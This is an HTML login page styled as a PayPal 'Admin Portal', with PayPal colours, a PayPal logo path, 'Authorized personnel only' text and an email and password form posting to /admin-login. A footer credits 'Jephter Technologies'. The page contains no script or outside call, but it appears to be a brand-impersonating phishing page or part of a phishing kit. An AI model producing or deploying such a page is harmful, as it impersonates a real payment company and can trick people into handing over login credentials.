<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login - PayPal</title>
    <link rel="icon" href="/favicon.ico">

    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        :root {
            --radius-md: 10px;
            --radius-xl: 16px;
            --shadow-lg: 0 10px 30px rgba(0,0,0,0.15);
            --shadow-xl: 0 20px 50px rgba(0,0,0,0.2);
            --gray: #6c7378;
            --gray-light: #e1e4e8;
            --transition-fast: 0.2s ease;
            --transition-normal: 0.3s ease;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
        }

        body {
            margin: 0;
            min-height: 100vh;
            background: linear-gradient(135deg, #2c3e50, #34495e);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-container {
            width: 100%;
            padding: 2rem;
            display: flex;
            justify-content: center;
        }

        .login-card {
            background: #ffffff;
            width: 100%;
            max-width: 460px;
            padding: 3rem;
            border-radius: var(--radius-xl);
            box-shadow: var(--shadow-xl);
            position: relative;
        }

        .login-card::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 6px;
            background: linear-gradient(90deg, #0070ba, #003087);
            border-top-left-radius: var(--radius-xl);
            border-top-right-radius: var(--radius-xl);
        }

        .login-header {
            text-align: center;
            margin-bottom: 2rem;
        }

        /* ✅ LOGO FIX */
        .login-logo {
            display: flex;
            justify-content: center;
            margin-bottom: 1.5rem;
        }

        .login-logo img {
            width: 150px;
            height: auto;
            display: block;
        }

        .login-header h1 {
            font-size: 1.9rem;
            margin-bottom: 0.4rem;
            color: #2c2e2f;
        }

        .login-header p {
            font-size: 0.95rem;
            color: var(--gray);
        }

        .security-notice {
            background: rgba(0,112,186,0.08);
            border: 1px solid rgba(0,112,186,0.2);
            border-radius: var(--radius-md);
            padding: 1rem;
            font-size: 0.85rem;
            margin-bottom: 1.5rem;
            color: #2c2e2f;
        }

        .security-notice i {
            color: #0070ba;
            margin-right: 8px;
        }

        .login-form .form-group {
            margin-bottom: 1.4rem;
        }

        .form-label {
            display: block;
            margin-bottom: 6px;
            font-size: 0.85rem;
            color: var(--gray);
        }

        .form-input {
            width: 100%;
            padding: 14px 16px;
            font-size: 1rem;
            border-radius: var(--radius-md);
            border: 2px solid var(--gray-light);
            transition: border var(--transition-fast), box-shadow var(--transition-fast);
        }

        .form-input:focus {
            outline: none;
            border-color: #0070ba;
            box-shadow: 0 0 0 3px rgba(0,112,186,0.15);
        }

        .login-btn {
            width: 100%;
            margin-top: 1rem;
            padding: 14px;
            border: none;
            border-radius: var(--radius-md);
            background: linear-gradient(135deg, #0070ba, #003087);
            color: white;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: transform var(--transition-normal), box-shadow var(--transition-normal);
        }

        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0,48,135,0.35);
        }

        .login-footer {
            margin-top: 2rem;
            padding-top: 1.5rem;
            border-top: 1px solid var(--gray-light);
            text-align: center;
            font-size: 0.85rem;
            color: var(--gray);
        }

        .login-footer a {
            display: inline-block;
            margin-top: 10px;
            color: #0070ba;
            text-decoration: none;
            font-weight: 600;
        }

        .login-footer a:hover {
            text-decoration: underline;
        }

        @media (max-width: 480px) {
            .login-card {
                padding: 2.2rem 1.8rem;
            }

            .login-logo img {
                width: 130px;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="login-card">

            <div class="login-header">
                <div class="login-logo">
                    <!-- ✅ IMAGE PATH -->
                    <img src="/assets/logo.png" alt="PayPal Logo">
                </div>
                <h1>Admin Portal</h1>
                <p>Secure access to PayPal administration</p>
            </div>

            <div class="security-notice">
                <i class="fas fa-shield-alt"></i>
                <strong>Restricted Access:</strong> Authorized personnel only.
            </div>

            <form class="login-form" method="POST" action="/admin-login">
                <div class="form-group">
                    <label class="form-label">Admin Email</label>
                    <input type="email" name="email" class="form-input" placeholder="admin@paypal.com" required>
                </div>

                <div class="form-group">
                    <label class="form-label">Password</label>
                    <input type="password" name="password" class="form-input" placeholder="••••••••" required>
                </div>

                <button type="submit" class="login-btn">
                    <i class="fas fa-lock"></i> Login to Admin
                </button>
            </form>

            <div class="login-footer">
                <p><i>ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴊᴇᴘʜᴛᴇʀ ᴛᴇᴄʜɴᴏʟᴏɢɪᴇꜱ</i></p>
                <a href="/">
                    <i class="fas fa-arrow-left"></i> Back to User Site
                </a>
            </div>

        </div>
    </div>

</body>
</html>
